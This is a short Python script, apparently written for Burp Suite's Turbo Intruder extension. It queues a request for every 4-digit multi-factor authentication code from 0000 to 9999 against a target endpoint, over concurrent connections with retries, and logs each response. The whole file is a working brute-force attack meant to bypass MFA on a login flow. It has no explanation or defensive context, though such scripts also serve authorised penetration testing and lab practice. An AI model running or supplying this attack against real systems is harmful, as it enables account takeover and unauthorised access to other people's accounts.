def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=4,
                           requestsPerConnection=3333,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=30,
                           maxRetriesPerRequest=10
                           )


    for x in range(10000):
        number = str(x).zfill(4)
        engine.queue(target.req, [number], label="mfa:%s" % number)




def handleResponse(req, interesting):
    table.add(req)
